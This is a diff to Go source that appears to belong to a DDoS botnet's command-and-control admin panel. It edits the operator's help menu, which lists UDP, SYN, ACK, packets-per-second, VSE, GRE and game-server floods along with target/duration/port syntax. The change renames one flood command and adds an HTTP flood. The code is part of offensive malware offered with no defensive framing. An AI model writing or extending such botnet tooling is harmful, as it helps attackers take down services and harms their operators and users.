@@ -477,7 +477,7 @@ func Admin(conn net.Conn) {
 			})
 
 			rows := [][]string{
-				{"threads", ansiCommands + "udp flood with threads." + ansiReset},
+				{"udpthread", ansiCommands + "udp flood with threads." + ansiReset},
 				{"synflood", ansiCommands + "tcp flood with syn flag." + ansiReset},
 				{"ackflood", ansiCommands + "tcp flood with ack flag." + ansiReset},
 				{"ppsflood", ansiCommands + "udp flood for high packets per seconds." + ansiReset},
@@ -488,6 +488,7 @@ func Admin(conn net.Conn) {
 				{"vseflood", ansiCommands + "value source engine flood." + ansiReset},
 				{"greip", ansiCommands + "gre ip flood." + ansiReset},
 				{"tcpwra", ansiCommands + "tcp custom flood for games." + ansiReset},
+				{"httpflood", ansiCommands + "HTTP raw flood." + ansiReset},
 				{"", ""},
 				{"syntax", ansiCommands + ".stdhex 1.1.1.1 60 dport=80" + ansiReset},
 			}
